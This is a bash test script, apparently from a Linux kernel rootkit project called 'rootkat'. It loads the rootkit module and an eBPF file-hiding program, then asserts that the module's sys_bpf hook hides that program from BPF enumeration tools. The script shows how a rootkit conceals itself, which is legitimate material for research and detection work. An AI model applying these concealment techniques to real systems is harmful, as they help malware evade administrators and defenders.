#!/usr/bin/env bash
# Asserts: rootkat's sys_bpf hook hides the file-hide eBPF program from
# `bpftool prog list` and any other BPF_PROG_GET_NEXT_ID enumerator.
set -u
cd /root/rootkat
. tests/qemu/lib.sh

# Load rootkat first; its sys_bpf hook installs at module init.
assert_zero "module loads" insmod lkm/rootkat.ko

# Load the eBPF program (which rootkat hides by name "hide_file_open").
echo "x" > /tmp/secret.txt
cd ebpf
./loader secret.txt > /tmp/loader.log 2>&1 &
LOADER_PID=$!
sleep 1
cd ..

# Enumerate BPF progs. Our prog should NOT appear, even though it is
# loaded (the loader is alive).
ENUM_OUTPUT=$(tests/qemu/bpf_lister 2>&1)
echo "=== bpf_lister output ==="
echo "$ENUM_OUTPUT"
echo "==="

assert_zero    "loader still alive (prog loaded)"  kill -0 $LOADER_PID
assert_nonzero "hide_file_open hidden from enum"   \
	bash -c "echo '$ENUM_OUTPUT' | grep -q hide_file_open"

# Sanity: a different prog (if any) is still visible.
# (BPF_PROG_GET_NEXT_ID itself returning > 0 entries means enumeration works.)
if [ -z "$ENUM_OUTPUT" ]; then
	echo "INFO: no BPF progs visible at all (no kernel-loaded progs on this image)"
else
	echo "INFO: enumeration returned $(echo "$ENUM_OUTPUT" | wc -l) prog(s)"
fi

kill -INT $LOADER_PID 2>/dev/null || true
wait $LOADER_PID 2>/dev/null || true

assert_zero "module unloads" rmmod rootkat

# Post-unload: the prog (if any new one is loaded) should be visible.
# We don't reload the loader here — the assertion that matters is the
# one inside the hook's lifetime above.
report
